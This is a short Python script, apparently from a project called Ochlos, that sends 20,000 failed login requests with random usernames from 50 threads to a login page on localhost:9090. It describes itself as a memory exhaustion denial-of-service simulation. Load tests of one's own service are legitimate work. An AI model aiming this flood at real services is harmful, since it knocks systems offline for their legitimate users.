# Ochlos/scripts/memory_exhaustion.py
# Perform memory exhaustion attack to localhost:9090

import urllib3
import requests
import uuid
import concurrent.futures


# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)

TARGET_URL = "https://localhost:9090/login"

def send_failed_login(_):
    random_username = f"user_{uuid.uuid4().hex[:10]}"

    payload = {
        "username": random_username,
        "password": "wrong_password"
    }

    try:
        requests.post(TARGET_URL, data=payload, verify=False, timeout=1)
    except Exception:
        pass

if __name__ == "__main__":
    print("[+] Starting Memory Exhaustion DoS Attack simulation...")

    # 50 thread & total 20,000 send (each 400)
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(send_failed_login, range(20000))

    print("[+] Simulation complete")